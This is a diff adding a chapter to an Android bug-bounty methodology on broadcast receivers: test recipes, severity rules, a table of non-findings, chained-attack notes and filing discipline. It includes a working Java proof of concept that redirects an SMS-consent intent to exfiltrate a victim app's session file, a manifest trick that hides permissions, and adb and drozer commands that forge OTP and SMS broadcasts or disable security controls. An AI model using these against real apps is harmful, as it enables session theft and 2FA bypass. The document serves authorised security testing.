+  Build it against `play-services-base` purely to construct `Status(0)`, and strip Play Services' merged
+  permissions so the shipped manifest declares only `INTERNET`:
+```xml
+<uses-permission android:name="android.permission.READ_SMS" tools:node="remove"/>
+<uses-permission android:name="android.permission.RECEIVE_SMS" tools:node="remove"/>
+```
+```java
+Intent prize = new Intent(Intent.ACTION_VIEW,
+    Uri.parse("content://com.target.app.fileprovider/files/session_backup_payload"));
+prize.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+prize.setComponent(new ComponentName(this, ExfilActivity.class));   // YOUR activity receives the grant
+
+Intent b = new Intent("com.google.android.gms.auth.api.phone.SMS_RETRIEVED");
+b.setPackage("com.target.app");
+b.putExtra(SmsRetriever.EXTRA_STATUS, new Status(CommonStatusCodes.SUCCESS));
+b.putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, prize);
+sendBroadcast(b);   // spray; see the BAL note
+```
+  In `ExfilActivity`, read `getContentResolver().openInputStream(getIntent().getData())` and POST the bytes
+  out.
+  **BAL precondition (decisive on API 34+):** the victim can only launch the redirected Intent while it has
+  a visible window (`BAL_ALLOW_VISIBLE_WINDOW`). If your app is in the foreground the victim is backgrounded
+  and the launch is blocked. Spray the broadcast repeatedly and call `moveTaskToBack(true)` immediately so
+  the victim resumes to the foreground before a spray lands. Report it as **"captures on the victim's next
+  OTP screen"**, not as unconditional — the receiver only exists while that screen is live.
+- **Proof:** Your attacker-side collector displaying the victim's private file contents — name, phone,
+  user id, session token — captured on a separate device, with no shell, no adb and no root; plus the
+  installed PoC's `requested permissions` block showing only `INTERNET`.
+- **Escalation:** Point `data=` at a protected provider the victim can reach (Contacts, CallLog) for a
+  proxied provider read. The write direction is D08; the loaded-code direction is D17. The generalisation:
+  **any** `registerForActivityResult`/`onActivityResult` launcher fed an attacker `Parcelable` Intent from
+  an exported receiver has this shape.
+- **Ruled out when:** The consent Intent is validated before launch — component or scheme allow-list,
+  `FLAG_GRANT_*` stripped, or passed through `androidx.core.content.IntentSanitizer` — **or** the receiver
+  is guarded per D05-050. Also honestly ruled out (downgraded, not dropped) when no byte-returning gadget
+  exists in this build: if the victim reads its own file and nothing crosses the boundary, say so and rate
+  it Medium with the precondition stated. Two verified links plus one unproven link is a Medium, not a
+  Critical.
+
+### D05-052 · The OTP-injection variant — trace the handshake before claiming it
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical (a forged OTP that advances an auth flow); usually a recorded negative |
+| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3), or `authentication_bypass` (P1) with full takeover |
+| **Attacker** | AM-03 |
+| **Applies to** | All apps with SMS/WhatsApp OTP autofill. |
+| **Maps to** | MASWE-0020 (Local Authentication Can Be Bypassed); MASTG-TEST-0366 |
+
+- **Test:** The same receiver shape yields two different findings. The Intent-launch variant (D05-051) is
+  nearly always real. The OTP-injection variant usually is not: the receiver is often a no-op unless a read
+  is in progress, and it is gated by an unguessable per-session handshake identifier plus server-side OTP
+  verification. Trace it before claiming it, and record the negative properly when it holds.
+- **How:** Read `onReceive` in jadx and list **every** key it consumes and every branch condition:
+```bash
+awk '/class .*SmsVerification|class .*OtpReceiver|class .*AutoRead/,/^}/' out/sources/**/*.java
+grep -nE 'getStringExtra|equals\(|requestId|sessionId|handshake|uuid|nonce' <the receiver file>
+```
+  Then replay every key, including the handshake field with both a random and a captured value:
+```bash
+run app.broadcast.send --component com.target.app com.target.app.OtpAutoReadReceiver \
+    --extra string otp 123456 --extra string requestId <captured-or-random>
+```
+  Watch the server side: an accepted OTP must produce a successful `verify` response, not just a filled
+  text field.
+- **Proof:** Either the app accepts a forged OTP **and** the backend issues a session (that is the finding
+  — show the 200 and the session), or the app drops the broadcast in the absence of the live handshake
+  identifier (that is the negative — record the branch and the dropped-broadcast logcat).
+- **Escalation:** A genuine acceptance is a 2FA bypass → D13 account takeover.
+- **Ruled out when:** The handler compares an unguessable per-request identifier before consuming the code
+  **and** the backend independently verifies the OTP, so a client-side fill changes nothing. This is a
+  real and common true negative — a worked example is an auto-read receiver that accepts external
+  broadcasts, returns `result=0`, and drops them because no live read session matches. Write it up with the
+  decompiled branch.
+
+### D05-053 · Telephony `SMS_RECEIVED` receiver fed a forged OTP body
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3); `broken_access_control.exposed_sensitive_android_intent` (null) for the mechanism |
+| **Attacker** | AM-03 |
+| **Applies to** | Apps holding `RECEIVE_SMS`/`READ_SMS` with their own SMS parser. `SmsRetriever` (hash-bound, no permission) is the safe API; `RECEIVE_SMS` plus a broadcast receiver is the risky one. |
+| **Maps to** | ATT&CK T1624.001 (names `SMS_RECEIVED` among the registrable broadcasts); MASWE-0018 |
+
+- **Test:** `android.provider.Telephony.SMS_RECEIVED` is a protected broadcast, so you cannot send it by
+  action — but the receiver is still reachable **by explicit component** (D05-006), and a receiver that
+  parses `getMessagesFromIntent(intent)` or reads a `body` extra without verifying the originating address
+  will happily parse your forged message.
+- **How:**
+```bash
+grep -rnE 'SMS_RECEIVED|getMessagesFromIntent|Telephony\.Sms|createFromPdu|getOriginatingAddress|getDisplayMessageBody' out/sources/ out/AndroidManifest.xml
+adb shell am broadcast -n com.target.app/.SmsReceiver \
+  -a android.provider.Telephony.SMS_RECEIVED --es body "Your code is 123456"
+adb logcat -b radio -v time -d | tail -40
+```
+- **Proof:** The app's OTP field auto-filling from your explicitly targeted broadcast, and — the half that
+  decides severity — the subsequent `verify` call succeeding server-side.
+- **Escalation:** → D13. Combine with D05-036 (ordered-broadcast interception on API <= 35) to also
+  suppress the genuine SMS.
+- **Ruled out when:** The receiver validates `getOriginatingAddress()` against a sender allow-list **and**
+  rejects a message with no valid PDU, or the app uses `SmsRetriever` (which binds the message to the app's
+  signing-certificate hash) rather than parsing raw SMS. Note the hash binding explicitly.
+
+### D05-054 · Restricted App Standby Bucket suppresses `BOOT_COMPLETED` — disarming a security control
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) when a security feature is the thing disabled; the `app_crash.malformed_android_intents` node (P5) is not the right filing |
+| **Attacker** | AM-03 / AM-11 |
+| **Applies to** | Android 12+ for the bucket, **Android 13+** for the broadcast suppression: an app in the restricted bucket receives neither `BOOT_COMPLETED` nor `LOCKED_BOOT_COMPLETED`, alarms do not fire and jobs do not run. |
+| **Maps to** | `developer.android.com/about/versions/13/behavior-changes-13`; `developer.android.com/about/versions/13/behavior-changes-all`; `developer.android.com/about/versions/12/behavior-changes-all` (`am set-standby-bucket`) |
+
+- **Test:** If the app relies on a boot receiver to re-arm a security control — device-loss tracking, MDM
+  check-in, remote-wipe polling, a RASP heartbeat — then pushing it into the restricted bucket disables
+  that control without touching the APK.
+- **How:**
+```bash
+adb shell am set-standby-bucket com.target.app restricted
+adb shell am get-standby-bucket com.target.app
+adb reboot
+adb logcat -d | grep -iE 'BOOT_COMPLETED|ReArm|heartbeat|checkin'
+adb shell dumpsys alarm | grep -A3 com.target.app
+```
+- **Proof:** The boot receiver never running after reboot while the app is in the restricted bucket, and
+  the security control remaining disarmed — paired with the same reboot in the `active` bucket where it
+  does run. Report as "a security feature can be disabled by an unprivileged local action".
+- **Escalation:** → D21: defeat a RASP or telemetry heartbeat without modifying the app.
+- **Ruled out when:** The control re-arms on next app launch or on a server-driven push, or the boot
+  receiver only warms a cache. Show the re-arm.
+
+### D05-055 · Android 15 force-stop cancels every `PendingIntent` — time-based controls silently die
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) when the cancelled action is a security control |
+| **Attacker** | AM-11 (the user or anyone with the unlocked device force-stops the app) |
+| **Applies to** | **Android 15+, all apps regardless of targetSdk.** Entering the stopped state cancels every pending intent the app created; widgets grey out until the user relaunches. |
+| **Maps to** | `developer.android.com/about/versions/15/behavior-changes-all` (stopped state cancels pending intents; widgets disabled; `ApplicationStartInfo.wasForceStopped()`) |
+
+- **Test:** Apps that treat an outstanding `PendingIntent` as a durable capability — a scheduled session
+  expiry, a wipe-on-timeout, a "resume secure session" alarm — lose it silently on Android 15. This is both
+  a finding and a methodology trap: force-stopping between PoC setup and PoC trigger invalidates your own
+  test.
+- **How:**
+```bash
+adb shell dumpsys alarm | grep -A3 com.target.app     # baseline: the alarm is there
+adb shell am force-stop com.target.app
+adb shell dumpsys alarm | grep -A3 com.target.app     # gone
+grep -rn 'wasForceStopped\|ApplicationStartInfo' out/sources/   # does the app detect and re-arm?
+```
+- **Proof:** The `dumpsys alarm` before/after pair, plus the scheduled security action failing to fire and
+  no re-arm on the next launch.
+- **Escalation:** → D13 session-expiry bypass.
+- **Ruled out when:** The app calls `ApplicationStartInfo.wasForceStopped()` (or unconditionally re-arms on
+  every cold start) and the alarm reappears in `dumpsys alarm` after relaunch. Show the re-armed alarm.
+
+### D05-056 · Bluetooth `ACTION_KEY_MISSING` / `ACTION_ENCRYPTION_CHANGE` unhandled
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the companion device is the authenticator; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-06 (proximity) |
+| **Applies to** | **Android 16+ (API 36).** `BluetoothDevice#ACTION_KEY_MISSING` is broadcast when a remote bond is lost; `BluetoothDevice#ACTION_ENCRYPTION_CHANGE` when encryption status, algorithm or key size changes. |
+| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` (`ACTION_KEY_MISSING`, `ACTION_ENCRYPTION_CHANGE`, `CompanionDeviceManager#removeBond(int)`, "Consider bond restored if link successfully encrypted") |
+
+- **Test:** An app pairing with a companion device that matters — a smart lock, a medical device, a payment
+  dongle — and ignoring these broadcasts will keep issuing commands over a re-negotiated, possibly weaker or
+  attacker-established link. It cannot distinguish the genuine bonded device from an impostor after bond
+  loss.
+- **How:**
+```bash
+grep -rn 'ACTION_KEY_MISSING\|ACTION_ENCRYPTION_CHANGE\|ACTION_BOND_STATE_CHANGED\|createBond\|removeBond' out/sources/
+adb shell dumpsys bluetooth_manager | grep -A10 -i bond
+```
+  Force the condition by removing the bond on the peripheral and reconnecting, then watch whether the app's
+  command session continues unbroken.
+- **Proof:** The app continuing to exchange commands after `ACTION_KEY_MISSING` fires — logcat shows the
+  broadcast, the app's own logs show an unbroken session, and the command reaches the (now unbonded) peer.
+- **Escalation:** → D25 companion-device impersonation.
+- **Ruled out when:** The app registers for `ACTION_KEY_MISSING` and tears down the session, or re-verifies
+  the peer with an application-layer challenge on every reconnect regardless of bond state. Show the
+  teardown or the challenge.
+
+### D05-057 · `CONNECTIVITY_ACTION` and Wi-Fi broadcast stale assumptions that fail open
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); chain to the D14 filings once the relaxed branch is taken |
+| **Attacker** | AM-06 |
+| **Applies to** | Device **API >= 28**. `CONNECTIVITY_ACTION` is delivered only to context-registered receivers. Since Android 9, `WifiManager.NETWORK_STATE_CHANGED_ACTION` no longer carries SSID, BSSID, connection info or scan results. |
+| **Maps to** | `developer.android.com/guide/components/broadcasts` (Android 9 / Android 7.0 changes) |
+
+- **Test:** Apps that made a trust decision from these broadcasts — "we are on the corporate SSID, relax
+  pinning", "we are on a known network, skip the step-up" — are now making it from an empty payload. Find
+  the branch and determine which way it falls when the extra is absent.
+- **How:**
+```bash
+grep -rn 'CONNECTIVITY_ACTION\|NETWORK_STATE_CHANGED_ACTION\|EXTRA_WIFI_INFO\|getConnectionInfo\|getSSID\|getBSSID' out/sources/ -A10
+```
+  Read the branch: if the extra is null or empty, is the trusted or the untrusted path taken?
+- **Proof:** The relaxed behaviour observed directly — pinning skipped, step-up skipped — with Burp showing
+  the intercepted session on a device that never joined the "trusted" network.
+- **Escalation:** → D14 (TLS interception once the trusted-network branch is taken); → D13 if the branch
+  skips an authentication step.
+- **Ruled out when:** The absent-extra branch fails **closed** (trust denied when the SSID cannot be read),
+  or the app makes no network-identity trust decision at all. Quote the branch.
+
+### D05-058 · Run the pre-severity gate against the Critical claim, not against the receiver
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a — governs every Critical/High filing in this domain |
+| **Attacker** | n/a |
+| **Applies to** | Every Critical or High claim in D05. |
+| **Maps to** | Pre-severity gate and retraction discipline from the bug-hunting corpus |
+
+- **Test:** Write the draft Critical title, then substitute the **Critical claim** — not the bug — into each
+  question. (1) Have I validated the full chain to attacker-attainable impact, or only a primitive in the
+  middle? "Unguarded receiver confirmed" is not "session stolen". (2) What does the attacker walk away with,
+  in one concrete sentence? (3) Have I reproduced the full chain end to end at least twice, once during
+  discovery and once for the PoC? (4) Is there still a gate — a signature check, an audience check, a
+  handshake identifier, the BAL visible-window constraint — in the way? If yes it is not Critical; file it
+  as "primitive present" at a lower severity. (5) Has the program rejected this severity class before?
+- **How:** In this domain the gates that most often survive and kill a Critical are: the handshake
+  identifier in D05-052; the UID-scoped `DownloadManager.query` in D05-023; the BAL visible-window
+  requirement on API 34+ in D05-051; and server-side re-assertion of entitlement in D05-015. Test each
+  explicitly before writing the title.
+- **Proof:** Two independent end-to-end reproductions, and the gate question answered in writing for each.
+  For a High or Critical, reproduce through two independent paths where possible — the shell path and the
+  attacker-APK path are genuinely different stacks.
+- **Escalation:** n/a — this is a kill gate.
+- **Ruled out when:** n/a. If a claimed finding fails reproduction, do not silently drop it: record it in a
+  retraction appendix with the original signal and the disproving evidence. The inverse also holds — **do
+  not retract a confirmed finding that stopped reproducing because the client shipped a patch mid-engagement.**
+  Keep timestamped pre-patch evidence (the APK hash, the logcat, the video) and say so.
+
+### D05-059 · The five-screenshot pattern for a receiver state-change finding
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a — evidence standard |
+| **Attacker** | n/a |
+| **Applies to** | Every D05 finding whose impact is a state change (D05-014, -015, -016, -024). |
+| **Maps to** | Evidence-hygiene five-screenshot pattern; PoC standard |
+
+- **Test:** A state change needs a pre-state, the bug, and a post-state — plus the out-of-band side effect.
+  For a receiver finding the five beats map as follows.
+- **How:**
+  1. **Pre-state:** `adb shell run-as com.target.app cat shared_prefs/config.xml` showing the original
+     value, and the app's traffic going to the real host.
+  2. **The bug:** the broadcast being sent from the zero-permission PoC (its `requested permissions` block
+     visible in the same frame), with the marker in the extra.
+  3. **Post-state negative:** the old value gone from the prefs XML.
+  4. **Post-state positive:** the marker value present, and the app's next authenticated request arriving at
+     your host.
+  5. **Side effect:** whether the app or the backend raised any alert — proves whether a passive defence
+     exists.
+```
+Filenames: {finding-#}-step{n}-{description}.png
+e.g. 05-step2-broadcast-from-zeropermission-app.png
+```
+  Take all five in one sitting; do not relaunch the app between them, because a relaunch re-reads config and
+  invalidates the earlier captures. Redact the token body; **leave visible** the JSON key names, the trace
+  or request ids, your own attacker package name and UID — the triager needs those to correlate with
+  server-side logs.
+- **Proof:** Five numbered, cross-referenced images, referenced by filename in the report body.
+- **Escalation:** n/a.
+- **Ruled out when:** n/a — this is a deliverable standard, not a test.
+
+### D05-060 · Chain-filing order for receiver primitives
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a — filing strategy |
+| **Attacker** | n/a |
+| **Applies to** | Every multi-finding D05 chain, especially D05-050 → D05-051 → D08 → D17. |
+| **Maps to** | Chain-filing discipline from the bug-hunting corpus; "one fix = one bounty" |
+
+- **Test:** A chain is a **severity amplifier, not a merge request.** File the primitives first so their
+  ids exist, then the consumer that references them, then backfill the links.
+- **How:** For the canonical D05 chain:
+  1. File the unguarded SMS-consent registration (D05-050) at its standalone severity, with a placeholder
+     cross-reference line.
+  2. File the over-broad FileProvider root (D07) separately — it has an independent fix surface.
+  3. File the consumer: the end-to-end self-grant exfiltration (D05-051) at the chained severity, naming
+     the two primitive ids.
+  4. Edit each primitive to backfill the consumer's id.
+```markdown
+## Chain partners (filed as separate reports)
+- **submission [UUID-1]** — SMS User Consent receiver registered without SmsRetriever.SEND_PERMISSION
+- **submission [UUID-2]** — FileProvider root covers the whole files/ directory
+These primitives have independent fix surfaces and are filed separately per the program's
+"one fix = one bounty" rule.
+```
+  Do not paste the whole chain narrative into every primitive, do not claim each primitive is independently
+  Critical, and do not ask for one combined bounty. Submit in order — primitives, then the consumer, then
+  clean standalone findings — and not all within minutes of each other.
+- **Proof:** Cross-referenced ids in both directions.
+- **Escalation:** n/a.
+- **Ruled out when:** n/a — filing discipline.
+
+## Graveyard for this domain
+
+| Observation | Why it is not a finding | What would make it one |
+|---|---|---|
+| `am broadcast` with a malformed extra crashes the app | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**. Grab, Spotify, Xiaomi, Reddit and TikTok all exclude crash-only Intent reports; Google's invalid-reports list: "Triggering a local temporary Denial of Service ... resolved by removing the app and rebooting" is ineligible. | The crash survives reinstall and reboot (persistent DoS), or the malformed input reaches a memory-safety sink you can steer (→ D16), or the same parser is remotely triggerable. Then file `application_level_denial_of_service_dos.critical_impact_and_or_easy_difficulty` (P2) or the RCE path. |
+| "Receiver X is `exported="true"`" with no sink read | An exported component is a **primitive, not a finding**. The VRT node is priority-null; with nothing demonstrated it rates nothing. | Read `onReceive` to its sink and show a state change, a data disclosure, or a forwarded Intent. The inventory row becomes a finding only when paired with an effect. |
+| `sendStickyBroadcast` found in a bundled library, never called on the tested platform | Deprecated at API 21; `BROADCAST_STICKY` is no longer grantable to normal third-party apps. A grep hit in dead code is not reachability. | The call executes on the tested platform and `registerReceiver(null, filter)` returns the extras — or the target is an OEM/preinstalled/low-`minSdk` app where it still works. |
+| Effect reproduced only from `adb shell` | `shell` (uid 2000) holds far more than any installable app. The finding has not established AM-03 and a triager will say so. | Reproduce from a zero-permission APK and ship its installed `requested permissions` block. |
+| `Broadcast completed: result=0` with no observed side effect | `am broadcast` prints `result=0` when nothing matched at all. It is the domain's layer-ordering trap. | A pid-scoped logcat line, a prefs byte diff, a `dumpsys` delta or a marker-bearing network request, with a junk-action negative control showing the identical `result=0`. |
+| `android:priority` above 100 in the target's own manifest (MobSF `high_intent_priority_found`) | A red flag for the *target*, not an attack against it. In your PoC it is the technique, not the bug. | The high priority lets the target pre-empt another app's ordered broadcast in a way that hides security-relevant content from the user — and it still works on the tested API level. |
+| `LocalBroadcastManager` present and deprecated | Deprecation is not a vulnerability; `LocalBroadcastManager` is the *safe* option here. | The migration away from it converted an internal message into a global `sendBroadcast` carrying the same extras (D05-033). |
+| A `BOOT_COMPLETED` receiver exists | `RECEIVE_BOOT_COMPLETED` is a normal permission and auto-start is ordinary behaviour. | The boot path reads attacker-writable configuration (D05-024), or the receiver is reachable explicitly and does privileged work (D05-006). |
+| Ordered-broadcast interception demonstrated only on an API 36+ device | On Android 16 cross-process `android:priority` ordering is not guaranteed and priorities are clamped. The PoC will not reproduce for the triager. | Demonstrate on API <= 35 and version-gate the report ("affects the installed base below Android 16"), or switch to the sender-side result-trust variant (D05-039) which is *created* by the same change. |
+| Implicit broadcast intercepted, extras contain only non-sensitive state | The payout tracks the payload. Twitter #185862 paid $560 and Nextcloud #167481 paid nothing; Shopify #56002's `access_token` is what made that class matter. | Extras carry a session token, OTP, credential or precise location — then lead with the replayed 200, not with the architecture. |
+| OTP auto-read receiver is exported but drops the broadcast without a live handshake identifier | A verified true negative: no forged code reaches the auth flow, and the backend verifies independently. | The handshake identifier is guessable, absent, or not checked — and a forged code produces a successful server-side `verify`. |
+| Download-completion receiver acts on `extra_download_id` but `DownloadManager.query` is UID-scoped | The victim's query for your id returns an empty cursor, so no cross-app injection occurs. Record the empty cursor. | The handler resolves the id through a path that is not UID-scoped, or it accepts a `content://`/`file://` URI directly from the extras. |
+| A `Parcelable` extra crashes the receiver, with no gadget identified | Reachable deserialisation without a proven gadget is a primitive, and a crash alone is the P5 node. | A gadget class in the app's own dependency set is constructed in the victim's process (Frida `[REACHED]`), or the deserialisation reaches a file or code sink (→ D17). |
+| Receiver clears the session ("logout from any app") | Nuisance-grade availability; the user simply logs back in. | The receiver **sets** session state from an extra — that is fixation, and the victim then operates inside the attacker's account (D05-016). |
+| OAuth `client_secret` recovered from the app and seen in a broadcast extra | A mobile client secret is public by design and is on every program's never-submit list. | The reportable adjacent finding is **PKCE non-enforcement** on the public client (→ D13), not the secret's presence. |
+
+## Cross-surface joins
+
+- **D05 SMS User Consent receiver × D07 FileProvider root breadth × D08 URI grants.** Nobody reviews
+  `provider_paths.xml` next to the receiver registration list. Individually each is Medium at best: an
+  unguarded receiver with nothing to steal, and a wide provider root nothing can reach. Joined, the victim
+  starts your Intent with `FLAG_GRANT_READ_URI_PERMISSION` aimed at a `content://` URI under its own
+  `files/` root and self-grants a zero-permission app read access to its session store. The join is the
+  Critical; file the three parts per D05-060.
+- **D05 implicit broadcast of API responses × D15 shadow API.** The action strings and payloads you sniff
+  in D05-031 hand you the mobile client's full endpoint inventory for free — and a mobile app's hardcoded
+  backend calls are frequently an **older API version** than the current web app uses, with weaker auth,
+  weaker rate limits, weaker input validation and more field exposure. Diff the two versions
+  **behaviourally** for the same operation (does v1 accept no token, an expired token, or a lower-privilege
+  token that v2 rejects? does v1 return internal ids the current version redacts?). A version difference
+  alone is Informational; the weakened control is the finding.
+- **D05 receiver-driven config repoint × D14 network security config and pinning.** A receiver that writes
+  the base URL (D05-014) is rated Medium by most testers as "local state change". Joined with the network
+  chapter it is a full MitM with **no CA installed and no proxy configured** — every later authenticated
+  request goes to your host. The join also often disables pinning as a side effect, because pinning
+  configurations are host-scoped and your host is not in them.
+- **D05 AppWidgetProvider receiver × D08 PendingIntent template and `fillInIntent`.** Widget code lives
+  outside the main app module and is rarely reviewed. The provider receiver **must** be exported, and
+  collection widgets supply one template `PendingIntent` plus a per-item `fillInIntent` whose data
+  frequently originates from server content. An under-specified template lets the fill-in choose the launch
+  component, from the app's UID.
+- **D05 ordered-broadcast interception × D13 OTP pipeline × D24 push.** On API <= 35, intercept the ordered
+  broadcast carrying the code, `abortBroadcast()` the fraud alert that would have warned the user, and
+  replay the code — three surfaces owned by three different reviewers, and the chain is a 2FA bypass with a
+  suppressed alarm.
+- **D05 boot receiver × D22 auto-backup and restore.** The boot handler runs before any user is present and
+  reads configuration that a restore can control. Backup rules that include a preferences file the boot path
+  trusts turn a restore into pre-authentication config injection — the two are never reviewed in the same
+  session because one is "storage" and the other is "components".
+- **D05 receiver registration lifetime × D04 activity lifecycle.** The single most common false negative in
+  this chapter. Runtime receivers exist only while a particular screen is foreground — the SMS-consent
+  receiver lives exactly as long as the OTP screen. A component sweep run from the launcher screen
+  enumerates none of them and produces a clean, wrong, ruled-out register. Drive the app into each
+  authenticated state and re-run `dumpsys activity broadcasts` in every one.
+- **D05 implicit `ACTION_GET_CONTENT` result × D16/D17 the import parser.** The hijacked result (D05-046,
+  D05-047) is usually filed as a disclosure. Joined with the consumer, the attacker-chosen URI and
+  display name feed a native parser or land a file in a directory the app later loads from — which is the
+  path from a Medium to the RCE band.
+- **D05 receiver-forged notification × D09 deep link × D10 WebView.** A receiver that renders
+  attacker-supplied notification content (D05-017) usually also carries a deep-link extra for the tap
+  target. The notification supplies the credibility (it is inside the trusted app), the deep link supplies
+  the routing, and the WebView supplies the session — none of the three reviewers sees the other two.
+- **D05 `intent://` from a WebView × every local receiver primitive.** A WebView that calls
+  `Intent.parseUri(url, 0)` in `shouldOverrideUrlLoading` turns any attacker page into a remote broadcast
+  launcher: `intent://…#Intent;scheme=app;package=com.target.app;end`. That single D10 defect upgrades every
+  AM-03 finding in this chapter to AM-02, one click, which is a whole severity band. Check for it before you
+  settle on the attacker model.
+
+## Sources
+
+- OWASP MASTG/MASVS/MASWE: MASTG-TEST-0366, -0372, -0374, -0375, -0029 (deprecated, source of the
+  InsecureBankv2 `phonenumber`/`newpass` walkthrough); MASTG-TECH-0162, -0164, -0043; MASTG-KNOW-0025,
+  -0134; MASTG-BEST-0056; MASTG-TOOL-0015 (drozer), MASTG-TOOL-0110 (semgrep); MASTG-APP-0010; rules
+  `mastg-android-implicit-intent-leaking-extras` and `mastg-android-implicit-intent-internal-communication`;
+  MASWE-0018, -0020, -0032, -0050; MASVS-PLATFORM-1, MASVS-CODE-4.
+- Android platform documentation: `guide/components/broadcasts`; the risk articles
+  `insecure-broadcast-receiver`, `implicit-intent-hijacking`, `sticky-broadcast`, `sender-of-pending-intents`,
+  `intent-redirection`, `custom-permissions`; `training/permissions/restrict-interactions`; behaviour-change
+  pages for Android 13 (restricted bucket suppressing `BOOT_COMPLETED`), Android 14 (`RECEIVER_EXPORTED` /
+  `RECEIVER_NOT_EXPORTED`, implicit intents restricted to exported components), Android 15 (stopped state
+  cancels pending intents, `ApplicationStartInfo.wasForceStopped()`), Android 16 (ordered-broadcast priority
+  confined to the same process and clamped; `BluetoothDevice#ACTION_KEY_MISSING`,
+  `ACTION_ENCRYPTION_CHANGE`); `develop/ui/views/appwidgets`;
+  `reference/android/app/DownloadManager`; `developers.google.com/identity/sms-retriever/user-consent/request`.
+- Bugcrowd VRT release 2026-07-08: `broken_access_control.exposed_sensitive_android_intent` (priority null,
+  CWE-927, all-zero CVSS v3 vector — the priority comes entirely from what you demonstrate);
+  `broken_access_control.privilege_escalation`; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`;
+  `broken_authentication_and_session_management.authentication_bypass` and `.two_fa_bypass`;
+  `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) and the
+  `.high_impact_and_or_medium_difficulty` / `.critical_impact_and_or_easy_difficulty` nodes you must reach
+  to be paid for a DoS.
+- MITRE ATT&CK Mobile: T1624.001 Broadcast Receivers (names `BOOT_COMPLETED`, `CONNECTIVITY_CHANGE`,
+  `WIFI_STATE_CHANGED`, `USER_PRESENT`, `SCREEN_ON`/`OFF`, `SMS_RECEIVED`; EventBot, FakeSpy, SimBad);
+  T1635 Steal Application Access Token; T1533 Data from Local System; T1603 Scheduled Task/Job
+  (WorkManager/JobScheduler/AlarmManager); T1398.
+- Disclosed reports: H1 #56002 (Shopify — every API response broadcast, `access_token` + `admin_cookie`),
+  #185862 (Twitter location, Low, $560), #167481 (Nextcloud upload broadcasts), #192886 (Mapbox, Low,
+  $1000), #1596459 (Nextcloud Talk, Low 2.6, GHSA-564v-3rfc-352m), #394332 (VK, Low — zero-`INTERNET`
+  network request through the victim), #97295 (ok.ru forged private message), #289000 (vulnerable exported
+  receiver), #1142918 (Nextcloud poisoned `GET_CONTENT` result, Medium), #1408692 (Nextcloud, Low 2.3,
+  GHSA-vw2w-gpcv-v39f).
+- CVEs and vendor research: CVE-2020-8913 (Play Core < 1.7.2 — unprotected receiver, `split_id` traversal
+  into `verified-splits/config.*`, malicious `Parcelable` in `createFromParcel()`); CVE-2021-4438 (React
+  Native SMS User Consent); CVE-2023-44121 (LG ThinQ exported receiver action); CVE-2022-36837 (Samsung
+  Email — implicit Intents leak content); CVE-2023-30728 (Samsung PackageInstallerCHN); Oversecured's
+  Samsung categories "Broadcast Spoofing & Exposure" and "Implicit IPC Leakage" (SVE-2023-1112,
+  SVE-2023-0760, SVE-2023-0928) and its TikTok `NotificationBroadcastReceiver` analysis; bugscale's Samsung
+  `SmartSwitchReceiver` / `SAVE_URI_PATHS` chain.
+- Tooling: drozer `app.broadcast.info` (`-a`, `-f`, `-p`, `-i`, `-u`, `-v`), `app.broadcast.send`,
+  `app.broadcast.sniff` (`--action`, `--category`, `--data-authority`, `--data-path`, `--data-scheme`,
+  `--data-type`) — a 3.x fork plus `QUERY_ALL_PACKAGES` is needed on Android 11+; QARK
+  `send_broadcast_receiver_permission.py` (`BROADCAST_WITHOUT_RECEIVER`, `BROADCAST_WITH_RECEIVER`,
+  `BROADCAST_WITH_RECEIVER_UNDER_21`, `STICKY_BROADCAST`) and its `PROTECTED_BROADCASTS` list; MobSF
+  `high_intent_priority_found` / `high_action_priority_found`; semgrep, jadx, Frida, `adb shell am`,
+  `dumpsys package` / `dumpsys activity broadcasts` / `dumpsys appwidget` / `dumpsys jobscheduler`.
+- Google's mobile vulnerability-classes guidance: "Implicit broadcasts (sending)" (CWE-927) with the
+  auditing tip "Look for all intent broadcasts that do not have a target set ... Lacks `setComponent`,
+  `setClass`, `setClassName` or an explicit constructor"; "Implicit broadcasts (receiving)" (CWE-925) with
+  the note that checking `getCallingActivity()` in `onReceive` is not a real control.
+- Bug-hunting methodology corpus (Claude-BugHunter, 4,467 stars): the layer-ordering trap applied here as
+  the `result=0` kill gate; Marker Discipline and the Body-Diff Rule; the Shell-Loop Ban; the Shadow API
+  mobile-to-backend bridge; the Pre-Severity Gate run against the Critical claim; retraction discipline and
+  its inverse; the five-screenshot state-change pattern and the PII split of what to mask versus what to
+  leave visible; and chain-filing order (primitives first, consumer second, backfill the links).
